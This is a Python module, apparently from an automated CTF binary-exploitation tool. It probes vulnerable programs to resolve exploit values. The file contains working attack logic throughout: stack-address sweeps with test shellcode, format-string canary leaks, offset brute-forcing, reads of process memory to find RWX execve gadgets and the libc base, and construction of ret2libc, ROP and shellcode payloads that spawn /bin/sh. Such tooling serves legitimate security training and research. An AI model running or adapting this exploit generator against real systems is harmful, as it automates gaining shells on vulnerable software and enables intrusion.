"""Active solvers: probe the binary to find concrete exploit values."""
from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import termios
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from .config import Config
from .recon import ReconResult
from .strategy import Strategy


@dataclass
class SolveResult:
    strategy: str
    addresses: dict[str, int] = field(default_factory=dict)
    shellcode_hex: str = ""
    rop_chain: list[str] = field(default_factory=list)
    canary: int | None = None
    canary_pos: int | None = None
    payload_layout: str = ""
    notes: list[str] = field(default_factory=list)
    error: str = ""


# ---------------------------------------------------------------------------
# Runtime RWX page scanning
# ---------------------------------------------------------------------------

# Byte patterns for the i386 execve syscall gadgets.
# These cover the gadgets embedded in binaries that map their own RWX pages.
_EXECVE_GADGETS_I386: dict[str, bytes] = {
    "G_pop2":    b"\x58\x5b\xc3",   # pop eax; pop ebx; ret
    "G_pop_ebx": b"\x5b\xc3",        # pop ebx; ret
    "G_xor_eax": b"\x31\xc0\xc3",   # xor eax, eax; ret
    "G_store":   b"\x89\x03\xc3",   # mov [ebx], eax; ret
    "G_xor_ecx": b"\x31\xc9\xc3",   # xor ecx, ecx; ret
    "G_xor_edx": b"\x31\xd2\xc3",   # xor edx, edx; ret
    "G_mov_al":  b"\xb0\x0b\xc3",   # mov al, 0xb; ret
    "G_int80":   b"\xcd\x80\xc3",   # int 0x80; ret
}

_EXECVE_REQUIRED = frozenset(
    {"G_pop2", "G_xor_eax", "G_store", "G_xor_ecx", "G_xor_edx", "G_mov_al", "G_int80"}
)


def _read_rwx_pages(pid: int, out: list[tuple[int, bytes]]) -> None:
    """Append (start, data) for each non-stack rwx page in /proc/pid/maps."""
    try:
        maps_text = Path(f"/proc/{pid}/maps").read_text()
    except OSError:
        return
    try:
        mem_fd = open(f"/proc/{pid}/mem", "rb")
    except OSError:
        return
    try:
        for line in maps_text.splitlines():
            parts = line.split()
            if len(parts) < 2 or "rwx" not in parts[1]:
                continue
            tag = parts[-1] if len(parts) > 4 else ""
            if any(x in tag for x in ("[stack]", "[vvar]", "[vsyscall]", "[heap]")):
                continue
            lo, hi = (int(x, 16) for x in parts[0].split("-"))
            try:
                mem_fd.seek(lo)
                data = mem_fd.read(hi - lo)
                if data:
                    out.append((lo, data))
            except OSError:
                pass
    finally:
        mem_fd.close()


def _read_libc_base(pid: int) -> int | None:
    """Extract libc ELF base from /proc/pid/maps.

    The ELF base is the load address of the segment that maps file offset 0
    (the ELF header).  Searching for the r-xp (executable) segment is wrong
    because it maps at a non-zero file offset — subtracting that offset gives
    the correct base.  We use the simpler approach of finding the mapping with
    file offset == 0 directly.
    """
    try:
        maps = Path(f"/proc/{pid}/maps").read_text()
    except OSError:
        return None
    for line in maps.splitlines():
        if "libc" not in line:
            continue
        parts = line.split()
        if len(parts) < 5:
            continue
        try:
            file_offset = int(parts[2], 16)
            if file_offset == 0:
                return int(parts[0].split("-")[0], 16)
        except (ValueError, IndexError):
            pass
    return None


def probe_libc_base(
    binary: Path,
    input_mode: str,
    cfg: Config,
    verbose: bool = False,
) -> int | None:
    """Run the binary, pause before it exits, read libc base from /proc/maps.

    Works reliably when ASLR is disabled (setarch -R in wrapper), because libc
    loads at the same address every run — no leak stage needed.
    """
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)
    libc_base: int | None = None

    if input_mode in ("file-raw", "file-size-data"):
        fifo = Path(tempfile.mktemp(suffix=".lb_probe"))
        os.mkfifo(str(fifo))
        try:
            proc = subprocess.Popen(
                wrapper + [str(binary), str(fifo)],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(0.4)
            libc_base = _read_libc_base(proc.pid)
            if verbose:
                print(f"    libc probe: pid={proc.pid} base={hex(libc_base) if libc_base else 'not found'}")

            def _write_fifo() -> None:
                try:
                    with open(str(fifo), "wb") as f:
                        f.write(b"4 AAAA\n" if input_mode == "file-size-data" else b"AAAA")
                except OSError:
                    pass

            t = threading.Thread(target=_write_fifo, daemon=True)
            t.start()
            proc.wait(timeout=5)
            t.join(timeout=2)
        except Exception as exc:
            if verbose:
                print(f"    libc probe error: {exc}")
        finally:
            fifo.unlink(missing_ok=True)
    else:
        proc = subprocess.Popen(
            wrapper + [str(binary)],
            env=env,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(0.2)
        libc_base = _read_libc_base(proc.pid)
        if verbose:
            print(f"    libc probe: pid={proc.pid} base={hex(libc_base) if libc_base else 'not found'}")
        try:
            proc.stdin.close()  # type: ignore[union-attr]
        except OSError:
            pass
        proc.wait(timeout=3)

    return libc_base


def scan_runtime_rwx_pages(
    binary: Path,
    input_mode: str,
    cfg: Config,
    verbose: bool = False,
) -> list[tuple[int, bytes]]:
    """Run the binary and return (start, data) for each rwx page it creates.

    For file-based modes a FIFO is used as the input path: the binary starts,
    performs any mmap/memcpy setup, then blocks at fopen() waiting for a
    writer — giving a stable window to snapshot /proc/pid/maps and read the
    page contents before the process exits.
    """
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)
    pages: list[tuple[int, bytes]] = []

    if input_mode in ("file-raw", "file-size-data"):
        fifo = Path(tempfile.mktemp(suffix=".rwx_probe"))
        os.mkfifo(str(fifo))
        try:
            proc = subprocess.Popen(
                wrapper + [str(binary), str(fifo)],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            # Give the binary time to initialise (mmap/memcpy), then block at fopen(fifo)
            time.sleep(0.4)
            _read_rwx_pages(proc.pid, pages)
            if verbose:
                print(f"    rwx scan: pid={proc.pid} found {len(pages)} page(s)")

            # Unblock the binary by connecting as writer
            def _write_fifo() -> None:
                try:
                    with open(str(fifo), "wb") as f:
                        if input_mode == "file-size-data":
                            f.write(b"4 AAAA\n")
                        else:
                            f.write(b"AAAA")
                except OSError:
                    pass

            t = threading.Thread(target=_write_fifo, daemon=True)
            t.start()
            proc.wait(timeout=5)
            t.join(timeout=2)
        except Exception as exc:
            if verbose:
                print(f"    rwx scan error: {exc}")
        finally:
            fifo.unlink(missing_ok=True)

    else:  # stdin — binary blocks on read, so we have all the time we need
        proc = subprocess.Popen(
            wrapper + [str(binary)],
            env=env,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(0.2)
        _read_rwx_pages(proc.pid, pages)
        try:
            proc.stdin.close()  # type: ignore[union-attr]
        except OSError:
            pass
        proc.wait(timeout=3)

    return pages


def find_execve_gadgets_i386(
    pages: list[tuple[int, bytes]],
) -> dict[str, int]:
    """Search rwx pages for i386 execve syscall gadgets.

    Returns a mapping of gadget name → absolute address.  Only searches for
    the gadgets needed to build a complete execve(0xb) chain.
    """
    found: dict[str, int] = {}
    for base, data in pages:
        for name, pattern in _EXECVE_GADGETS_I386.items():
            if name in found:
                continue
            idx = data.find(pattern)
            if idx != -1:
                found[name] = base + idx
    return found


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run_with_payload(
    binary: Path, input_mode: str, raw_payload: bytes, cfg: Config
) -> int:
    """Write payload (already framed for input_mode), run binary, return exit code."""
    wrapper = cfg.wrapper_parts()
    env = {**os.environ, **cfg.env}

    if input_mode == "file-size-data":
        framed = str(len(raw_payload)).encode() + b" " + raw_payload + b"\n"
    elif input_mode == "file-raw":
        framed = raw_payload
    else:
        framed = raw_payload + b"\n"

    if input_mode in ("file-raw", "file-size-data"):
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".inp", delete=False) as f:
            f.write(framed)
            tmp = Path(f.name)
        try:
            r = subprocess.run(
                wrapper + [str(binary), str(tmp)],
                capture_output=True, env=env, timeout=5,
            )
            return r.returncode
        except Exception:
            return -1
        finally:
            tmp.unlink(missing_ok=True)
    else:
        try:
            r = subprocess.run(
                wrapper + [str(binary)],
                input=framed, capture_output=True, env=env, timeout=5,
            )
            return r.returncode
        except Exception:
            return -1


def _run_and_capture(
    binary: Path, input_mode: str, raw_payload: bytes, cfg: Config
) -> tuple[int, str]:
    """Like _run_with_payload but also returns stdout+stderr."""
    wrapper = cfg.wrapper_parts()
    env = {**os.environ, **cfg.env}

    if input_mode == "file-size-data":
        framed = str(len(raw_payload)).encode() + b" " + raw_payload + b"\n"
    elif input_mode == "file-raw":
        framed = raw_payload
    else:
        framed = raw_payload + b"\n"

    if input_mode in ("file-raw", "file-size-data"):
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".inp", delete=False) as f:
            f.write(framed)
            tmp = Path(f.name)
        try:
            r = subprocess.run(
                wrapper + [str(binary), str(tmp)],
                capture_output=True, env=env, timeout=5,
            )
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            return r.returncode, out
        except Exception:
            return -1, ""
        finally:
            tmp.unlink(missing_ok=True)
    else:
        try:
            r = subprocess.run(
                wrapper + [str(binary)],
                input=framed, capture_output=True, env=env, timeout=5,
            )
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            return r.returncode, out
        except Exception:
            return -1, ""


# ---------------------------------------------------------------------------
# Strategy-specific solvers
# ---------------------------------------------------------------------------

def scan_shellcode_addr(
    binary: Path,
    offset: int,
    input_mode: str,
    cfg: Config,
    base_addr: int = 0xbfffe2e4,
    esp_at_crash: int = 0,
    verbose: bool = False,
) -> int | None:
    """Probe with exit(42) shellcode to find the real buffer start address.

    Strategy: place the shellcode at position 0 of the buffer (not at the end
    of a NOP sled), so we're scanning for the exact buffer start.  This avoids
    issues where the binary's own code overwrites bytes in the middle of the
    NOP sled region before the function returns.

    If esp_at_crash is provided (from GDB), the buffer start is
    esp_at_crash - offset - 4, which is used as the primary scan centre.
    A linear ±0x200 sweep with 4-byte steps covers the typical GDB/real-exec
    difference caused by environment-variable layout differences.
    """
    from pwn import asm, context, p32, shellcraft

    saved_arch, saved_log = context.arch, context.log_level
    context.arch = cfg.target.arch
    context.log_level = "error"
    try:
        test_sc = asm(shellcraft.exit(42))
        if offset <= len(test_sc):
            return None  # shellcode won't fit
        # Shellcode at position 0; filler fills the rest of the buffer before EIP.
        filler = asm("nop") * (offset - len(test_sc))

        # Derive primary centre from GDB's ESP register.
        if esp_at_crash:
            gdb_buf_start = esp_at_crash - offset - 4
            centers = [gdb_buf_start, base_addr]
        else:
            centers = [base_addr]

        seen: set[int] = set()
        # Fine-grained linear sweep: ±0x200 with 4-byte steps, then coarser fallback.
        fine_deltas = list(range(-0x200, 0x201, 4))
        coarse_deltas = [
            0x300, -0x300, 0x400, -0x400, 0x500, -0x500,
            0x600, -0x600, 0x800, -0x800,
        ]
        all_deltas = fine_deltas + coarse_deltas

        for center in centers:
            for delta in all_deltas:
                addr = center + delta
                if addr in seen or addr < 0x8000 or addr > 0xc0000000:
                    continue
                seen.add(addr)
                # payload: shellcode at byte-0, filler, then p32(addr) as return addr
                raw = test_sc + filler + p32(addr)
                rc = _run_with_payload(binary, input_mode, raw, cfg)
                if verbose:
                    mark = "  ✓" if rc == 42 else ""
                    print(f"    {hex(addr)}: exit={rc}{mark}")
                if rc == 42:
                    return addr
        return None
    finally:
        context.arch = saved_arch
        context.log_level = saved_log


def _canary_from_output(out: str) -> int | None:
    """Return the first hex token that looks like a stack canary (low byte == 0x00)."""
    for token in out.split():
        tok = token.strip("(),\n\r")
        if not tok.lower().startswith("0x"):
            continue
        try:
            val = int(tok, 16)
            if (val & 0xff) == 0x00 and val != 0 and val < 0x100000000:
                return val
        except ValueError:
            pass
    return None


def probe_canary_fmt(
    binary: Path,
    input_mode: str,
    cfg: Config,
    max_pos: int = 64,
    verbose: bool = False,
) -> tuple[int, int] | None:
    """Send %N$p probes to find format-string leak of stack canary.

    Returns (position, canary_value) or None.
    Canary heuristic: 4-byte value whose low byte is 0x00 and isn't all-zeros.

    For file-based binaries the format string goes via stdin (the binary reads a
    name/prompt from stdin and echoes it back), while the binary also receives a
    minimal valid file as argv[1].
    """
    if input_mode in ("file-raw", "file-size-data"):
        return _probe_canary_fmt_file(binary, input_mode, cfg, max_pos, verbose)

    for pos in range(1, max_pos + 1):
        fmt = f"%{pos}$p".encode()
        rc, out = _run_and_capture(binary, input_mode, fmt, cfg)
        if verbose:
            print(f"    pos {pos:2d}: {out.strip()[:60]}")
        val = _canary_from_output(out)
        if val is not None:
            return pos, val
    return None


def _probe_canary_fmt_file(
    binary: Path,
    input_mode: str,
    cfg: Config,
    max_pos: int = 64,
    verbose: bool = False,
) -> tuple[int, int] | None:
    """Probe when binary takes a file arg AND reads the format string from stdin.

    Creates a minimal valid input file (just 4 bytes), then sends %N$p via stdin
    and looks for the canary in stdout+stderr.
    """
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)

    # Minimal valid content for each file format
    if input_mode == "file-size-data":
        file_data = b"4 AAAA\n"
    else:
        file_data = b"AAAA"

    with tempfile.NamedTemporaryFile(mode="wb", suffix=".fmt_probe", delete=False) as f:
        f.write(file_data)
        probe_file = Path(f.name)

    try:
        for pos in range(1, max_pos + 1):
            # Send format string as the "name" stdin input, then Enter to continue
            stdin_data = f"%{pos}$p\n\n".encode()
            try:
                r = subprocess.run(
                    wrapper + [str(binary), str(probe_file)],
                    input=stdin_data,
                    capture_output=True,
                    env=env,
                    timeout=5,
                )
                out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            except Exception:
                continue

            if verbose:
                print(f"    pos {pos:2d}: {out.strip()[:80]}")

            val = _canary_from_output(out)
            if val is not None:
                return pos, val
    finally:
        probe_file.unlink(missing_ok=True)

    return None


def probe_canary_offset_file(
    binary: Path,
    input_mode: str,
    canary_pos: int,
    offset: int | None,
    cfg: Config,
    verbose: bool = False,
) -> tuple[int, int | None] | None:
    """Find OFFSET_TO_CANARY and (if possible) the total stack OFFSET.

    Phase 1 — vary fill size n from 4 to PROBE_SIZE in steps of 4.  Each probe
    writes exactly PROBE_SIZE bytes: A*n + canary + B*(PROBE_SIZE-n-4).  When
    the written canary aligns with the actual canary slot the check passes
    (rc != SIGABRT) — that n is OFFSET_TO_CANARY.

    Phase 2 — inject exit(42) at the return-address slot.  Payload:
    A*canary_off + canary + B*regs + exit_addr + 42.  When exit_addr lands at
    the true return address the binary calls exit(42) → rc == 42.  Corrupting
    saved EBP (the common false positive) causes SIGSEGV (rc == -11), not 42,
    so there are no false positives.  OFFSET = canary_off + 4 + regs.

    Returns (canary_off, total_offset) — total_offset may be None if Phase 2 fails.
    Returns None if canary_off cannot be determined.
    """
    import struct

    try:
        from pwn import process as pwn_process  # type: ignore
    except ImportError:
        return None

    PROBE_SIZE = 128          # big enough to overflow any reasonable stack frame
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)
    fifo_path = Path(tempfile.mktemp(suffix=".co_probe"))
    os.mkfifo(str(fifo_path))

    def _one_probe(build_payload):
        """Run one binary instance: leak canary, feed payload(canary), return rc."""
        fifo_fd = os.open(str(fifo_path), os.O_RDWR)
        proc = None
        try:
            proc = pwn_process(
                wrapper + [str(binary), str(fifo_path)],
                env=env,
                stdin=subprocess.PIPE,
                level="error",
            )
            proc.sendlineafter(b"name", f"%{canary_pos}$p".encode(), timeout=3)
            out = proc.recvuntil(b"continue", timeout=3)
            canary_val = _canary_from_output(out.decode("latin-1", errors="replace"))
            if canary_val is None or (canary_val & 0xFF) != 0x00:
                return None, None
            test = build_payload(canary_val)
            file_data = (str(len(test)).encode() + b" " + test
                         if input_mode == "file-size-data" else test)
            os.write(fifo_fd, file_data)
            proc.sendline(b"")
            proc.wait_for_close(timeout=5)
            return canary_val, proc.poll()
        except Exception as exc:
            if verbose:
                print(f"    probe error: {exc}")
            return None, None
        finally:
            try:
                os.close(fifo_fd)
            except OSError:
                pass
            if proc is not None:
                try:
                    proc.close()
                except Exception:
                    pass

    # Save terminal state before spawning any pwntools processes.  The probes
    # use stdin=PIPE so pwntools won't touch the TTY, but save/restore here is
    # a belt-and-suspenders guard against any future regression.
    _saved_term: list | None = None
    try:
        _saved_term = termios.tcgetattr(sys.stdin.fileno())
    except Exception:
        pass

    try:
        # ── Phase 1: find OFFSET_TO_CANARY ────────────────────────────────────
        # Write exactly PROBE_SIZE bytes each time so the overflow always reaches
        # well past the return address.  The canary lands at position n; when n
        # matches the actual canary slot the check passes (rc != SIGABRT).
        canary_off = None
        for n in range(4, PROBE_SIZE - 4, 4):
            def _p1(cv, _n=n):
                pad = PROBE_SIZE - _n - 4
                return b"A" * _n + struct.pack("<I", cv) + b"B" * pad
            canary_val, rc = _one_probe(_p1)
            if rc is None:
                continue
            if verbose:
                canary_hex = hex(canary_val) if canary_val else "?"
                print(f"    canary_offset {n:3d}: exit={rc} canary={canary_hex}")
            if rc not in (-6, 134):  # not SIGABRT → canary check passed
                canary_off = n
                break

        if canary_off is None:
            return None

        # ── Phase 2: find OFFSET by injecting exit(42) at the return-address slot
        # For each regs, build: A*canary_off + canary + B*regs + exit_addr + 42
        # When the exit_addr lands at the true return-address slot, the binary
        # calls exit(42) and the process exits with code 42.  Any earlier hit
        # (e.g., saved-EBP corruption causing SIGSEGV) gives a different code.
        # This avoids the false-positive SIGSEGV from corrupting saved EBP.
        EXIT_MARKER = 42
        exit_addr = None
        try:
            from pwn import ELF as _ELF
            _elf = _ELF(str(binary), checksec=False)
            exit_addr = (_elf.symbols.get("exit") or _elf.symbols.get("_exit")
                         or _elf.plt.get("exit") or _elf.plt.get("_exit"))
        except Exception:
            pass

        total_offset = None
        if exit_addr is not None:
            for regs in range(0, 64, 4):
                def _p2(cv, _r=regs, _co=canary_off, _ea=exit_addr):
                    # Layout after ret: [exit_addr][fake_ret_for_exit][exit_arg]
                    # exit() reads its argument from [ESP+4] (not [ESP+0]).
                    return (b"A" * _co + struct.pack("<I", cv)
                            + b"B" * _r + struct.pack("<III", _ea, 0, EXIT_MARKER))
                _, rc = _one_probe(_p2)
                if rc is None:
                    continue
                if verbose:
                    print(f"    total_offset {canary_off + 4 + regs:3d}: exit={rc} regs={regs}")
                if rc == EXIT_MARKER:
                    total_offset = canary_off + 4 + regs
                    break
        elif verbose:
            print("    total_offset: exit() not found in binary, skipping Phase 2")

        return (canary_off, total_offset)

    finally:
        fifo_path.unlink(missing_ok=True)
        if _saved_term is not None:
            try:
                termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, _saved_term)
            except Exception:
                pass


def _rop_chain_items(r: ReconResult, cfg: Config) -> list[tuple[str, int]]:
    """Build a ROP chain and return [(description, address)]."""
    try:
        from pwn import ELF, ROP, context
        context.arch = cfg.target.arch
        context.log_level = "error"
        elf = ELF(str(r.binary), checksec=False)
        libc = ELF(r.libc_path, checksec=False) if r.libc_path else None

        sys_addr = r.plt.get("system") or r.functions.get("system")
        binsh_addr = r.strings_found.get("/bin/sh")

        if cfg.target.arch == "i386":
            if sys_addr and binsh_addr:
                return [
                    ("system@plt", sys_addr),
                    ("ret_after_system (dummy)", 0x41414141),
                    ("/bin/sh ptr", binsh_addr),
                ]
            if libc and sys_addr is None:
                return [
                    ("NOTE: needs libc base leak first", 0),
                    ("system (libc offset)", libc.symbols.get("system", 0)),
                    ("/bin/sh (libc offset)", next(libc.search(b"/bin/sh"), 0)),
                ]
        else:
            rop = ROP(elf)
            if sys_addr and binsh_addr:
                try:
                    pop_rdi = rop.rdi.address
                    return [
                        ("pop rdi; ret", pop_rdi),
                        ("/bin/sh ptr", binsh_addr),
                        ("system@plt", sys_addr),
                    ]
                except Exception:
                    pass
    except Exception:
        pass
    return []


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def solve(
    strat: Strategy,
    r: ReconResult,
    cfg: Config,
    verbose: bool = False,
    esp_at_crash: int = 0,
) -> SolveResult:
    """Actively probe the binary to resolve all exploit values."""
    res = SolveResult(strategy=strat.name)

    if strat.name == "shellcode":
        try:
            from pwn import asm, context, shellcraft
            context.arch = cfg.target.arch
            context.log_level = "error"
            shellcode = asm(shellcraft.sh())
        except Exception as e:
            res.error = f"pwntools error: {e}"
            return res

        res.shellcode_hex = shellcode.hex()

        if strat.offset is None:
            res.error = "offset unknown — run probe first"
            return res

        NOP_SLED = 16
        if esp_at_crash:
            # Post-EIP layout: GDB measured ESP after ret directly — use it as the
            # return address. Shellcode is placed after the fake EIP so the buffer
            # size constraint (offset >= shellcode length) no longer applies.
            # A 16-byte NOP sled absorbs the tiny GDB-env vs real-env stack delta.
            total = strat.offset + 4 + NOP_SLED + len(shellcode)
            res.addresses["esp_at_overflow"] = esp_at_crash
            res.payload_layout = (
                f"[{strat.offset}x 'A'] [p32({hex(esp_at_crash)})] [{NOP_SLED}x NOP] [{len(shellcode)}x shellcode]"
                f"  →  {total} bytes total"
            )
            res.notes.append(
                f"shellcode: {len(shellcode)} bytes  post-EIP (ret→esp={hex(esp_at_crash)}, "
                f"nop_sled={NOP_SLED})"
            )
        else:
            # Fallback when no GDB esp measurement: scan for the buffer start.
            base = 0xbfffe2e4 if cfg.target.arch == "i386" else 0x7fffffffe000
            if verbose:
                print(f"  Scanning stack addresses (base={hex(base)}, no esp_at_crash)...")
            addr = scan_shellcode_addr(
                r.binary, strat.offset, strat.input_mode, cfg,
                base_addr=base, esp_at_crash=0, verbose=verbose,
            )
            if addr:
                res.addresses["esp_at_overflow"] = addr
                nop_len = strat.offset - len(shellcode)
                total = strat.offset + 4
                res.payload_layout = (
                    f"[{nop_len}x NOP] [{len(shellcode)}x shellcode] [p32({hex(addr)})]"
                    f"  →  {total} bytes total"
                )
                res.notes.append(f"shellcode: {len(shellcode)} bytes  nop_sled: {nop_len} bytes")
            else:
                res.error = "address scan exhausted — adjust BASE_ADDR in exploit or re-run GDB probe"

    elif strat.name == "ret2libc":
        sys_addr = r.plt.get("system") or r.functions.get("system")
        binsh_addr = r.strings_found.get("/bin/sh")

        if sys_addr:
            res.addresses["system"] = sys_addr
        if binsh_addr:
            res.addresses["binsh"] = binsh_addr

        if sys_addr and binsh_addr and strat.offset is not None:
            total = strat.offset + 12
            res.payload_layout = (
                f"[{strat.offset}x 'A'] [p32({hex(sys_addr)})] "
                f"[p32(0x41414141)] [p32({hex(binsh_addr)})]"
                f"  →  {total} bytes total"
            )

        # system() not in PLT → libc base would be needed for a normal ret2libc.
        # Before giving up, scan the binary's runtime memory for RWX pages that
        # contain embedded ROP gadgets (a common CTF trick).
        if not sys_addr and cfg.target.arch == "i386":
            if verbose:
                print("  system() not in PLT — scanning runtime memory for rwx pages …")
            pages = scan_runtime_rwx_pages(r.binary, strat.input_mode, cfg, verbose=verbose)
            if pages:
                gadgets = find_execve_gadgets_i386(pages)
                if verbose:
                    print(f"  gadgets found: {list(gadgets.keys())}")
                if _EXECVE_REQUIRED.issubset(gadgets.keys()):
                    # Full execve chain available — switch strategy
                    rwx_base = pages[0][0]
                    binsh_ptr = rwx_base + 0x400  # writable buffer in same page
                    strat.name = "rop-rwx"
                    strat.addresses.update(gadgets)
                    strat.addresses["BINSH"] = binsh_ptr
                    res.addresses.update(gadgets)
                    res.addresses["BINSH"] = binsh_ptr
                    res.notes.append(
                        f"Found execve gadgets in rwx page @ {hex(rwx_base)} — "
                        "using ROP execve chain (no libc needed)"
                    )
                    if verbose:
                        print(f"  ✓ strategy upgraded to rop-rwx  (rwx base={hex(rwx_base)})")
                else:
                    missing = _EXECVE_REQUIRED - gadgets.keys()
                    res.notes.append(f"Partial rwx gadgets — missing: {sorted(missing)}")
            else:
                # No rwx pages and no system@PLT.
                # ASLR is typically disabled via setarch -R in the wrapper, so libc
                # loads at a fixed address every run.  Probe that address directly
                # instead of requiring a two-stage leak exploit.
                if r.libc_path:
                    if verbose:
                        print("  No rwx pages — probing libc base (ASLR should be off) …")
                    libc_base = probe_libc_base(r.binary, strat.input_mode, cfg, verbose=verbose)
                    if libc_base:
                        try:
                            from pwn import ELF, context  # type: ignore
                            context.arch = cfg.target.arch
                            context.log_level = "error"
                            libc = ELF(r.libc_path, checksec=False)
                            resolved_system = libc_base + libc.symbols["system"]
                            resolved_binsh = libc_base + next(libc.search(b"/bin/sh"))
                            res.addresses["system"] = resolved_system
                            res.addresses["binsh"] = resolved_binsh
                            strat.addresses["system"] = resolved_system
                            strat.addresses["binsh"] = resolved_binsh
                            res.notes.append(
                                f"libc base probed @ {hex(libc_base)} (ASLR disabled) — "
                                "system and /bin/sh resolved without leak stage"
                            )
                            if strat.offset is not None:
                                total = strat.offset + 12
                                res.payload_layout = (
                                    f"[{strat.offset}x 'A'] [p32({hex(resolved_system)})] "
                                    f"[p32(0x41414141)] [p32({hex(resolved_binsh)})]"
                                    f"  →  {total} bytes total"
                                )
                            if verbose:
                                print(f"  ✓ system={hex(resolved_system)}  /bin/sh={hex(resolved_binsh)}")
                        except Exception as exc:
                            res.notes.append(f"libc base found but symbol resolution failed: {exc}")
                            res.notes.append("system() not in PLT — need libc base (see rop strategy)")
                    else:
                        res.notes.append("No rwx pages found at runtime — libc leak required")
                        res.notes.append("system() not in PLT — need libc base (see rop strategy)")
                else:
                    res.notes.append("No rwx pages found at runtime — libc leak required")
                    res.notes.append("system() not in PLT — need libc base (see rop strategy)")

    elif strat.name == "rop":
        items = _rop_chain_items(r, cfg)
        if items:
            res.rop_chain = [f"{desc:<30} {hex(addr)}" for desc, addr in items if addr]
            for desc, addr in items:
                if addr and addr != 0x41414141:
                    res.addresses[desc.split()[0].rstrip(":")] = addr
        else:
            res.notes.append("Could not auto-build chain — check gadgets with: ROPgadget --binary <bin>")

    elif strat.name == "canary-fmt":
        if verbose:
            print("  Probing format string positions (this may take a moment)...")
        found = probe_canary_fmt(r.binary, strat.input_mode, cfg, verbose=verbose)
        if found:
            res.canary_pos, res.canary = found
            # Remove the stale "find CANARY_FMT_POS" todo now that we've resolved it
            strat.todos = [t for t in strat.todos if "CANARY_FMT_POS" not in t]

            # Probe for the exact fill length before the canary (and total offset)
            if strat.input_mode in ("file-raw", "file-size-data"):
                if verbose:
                    print("  Probing OFFSET_TO_CANARY...")
                result = probe_canary_offset_file(
                    r.binary, strat.input_mode, res.canary_pos,
                    strat.offset, cfg, verbose=verbose,
                )
                if result is not None:
                    canary_off, found_offset = result
                    strat.addresses["canary_off"] = canary_off
                    strat.todos = [t for t in strat.todos if "OFFSET_TO_CANARY" not in t]
                    if verbose:
                        print(f"  ✓ OFFSET_TO_CANARY = {canary_off}")
                    if found_offset is not None and strat.offset is None:
                        strat.offset = found_offset
                        strat.todos = [t for t in strat.todos if "OFFSET" not in t]
                        if verbose:
                            print(f"  ✓ OFFSET = {found_offset} (auto-probed)")
        else:
            res.notes.append(
                "Canary not found via format string — binary may not echo output or "
                "format vuln uses a different input path"
            )

        # Also scan for RWX execve gadgets (statically linked binaries with embedded chains)
        if cfg.target.arch == "i386":
            if verbose:
                print("  Scanning runtime memory for rwx pages with execve gadgets...")
            pages = scan_runtime_rwx_pages(r.binary, strat.input_mode, cfg, verbose=verbose)
            if pages:
                gadgets = find_execve_gadgets_i386(pages)
                if verbose:
                    print(f"  gadgets found: {list(gadgets.keys())}")
                if _EXECVE_REQUIRED.issubset(gadgets.keys()):
                    rwx_base = pages[0][0]
                    binsh_ptr = rwx_base + 0x500
                    strat.name = "canary-fmt-rop-rwx"
                    strat.addresses.update(gadgets)
                    strat.addresses["BINSH"] = binsh_ptr
                    if found:
                        strat.addresses["canary_pos"] = res.canary_pos
                    res.addresses.update(gadgets)
                    res.addresses["BINSH"] = binsh_ptr
                    res.notes.append(
                        f"Found execve gadgets in rwx page @ {hex(rwx_base)} — "
                        "canary fmt-leak + ROP execve chain"
                    )
                    if verbose:
                        print(f"  ✓ strategy upgraded to canary-fmt-rop-rwx (rwx base={hex(rwx_base)})")
                else:
                    missing = _EXECVE_REQUIRED - gadgets.keys()
                    res.notes.append(f"Partial rwx gadgets — missing: {sorted(missing)}")

    elif strat.name == "canary-brute":
        res.notes.append("Brute-force canary: fork() detected — byte-by-byte attack viable")
        res.notes.append("Run the generated exploit script — brute() is implemented there")

    elif strat.name == "heap":
        res.notes.append("Heap exploitation requires manual GDB analysis")
        res.notes.append("Run: gdb ./binary  then: gef> heap chunks")

    return res


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def display(res: SolveResult) -> None:
    """Pretty-print a SolveResult."""
    W = 54
    print(f"\n{'━' * W}")
    print(f"  Strategy: {res.strategy}")
    print(f"{'━' * W}")

    if res.error:
        print(f"  ERROR: {res.error}")
        print(f"{'━' * W}")
        return

    if res.shellcode_hex:
        sc = bytes.fromhex(res.shellcode_hex)
        hex_rows = [res.shellcode_hex[i:i+32] for i in range(0, len(res.shellcode_hex), 32)]
        print(f"  Shellcode ({len(sc)} bytes):")
        for row in hex_rows:
            print("    " + " ".join(row[i:i+2] for i in range(0, len(row), 2)))

    if res.addresses:
        print(f"  Addresses:")
        for k, v in res.addresses.items():
            print(f"    {k:<28} {hex(v)}")

    if res.rop_chain:
        print(f"  ROP chain:")
        for item in res.rop_chain:
            print(f"    {item}")

    if res.canary is not None:
        print(f"  Canary position:  %{res.canary_pos}$p")
        print(f"  Canary value:     {hex(res.canary)}")

    if res.payload_layout:
        print(f"  Payload:")
        print(f"    {res.payload_layout}")

    for note in res.notes:
        print(f"  → {note}")

    print(f"{'━' * W}")
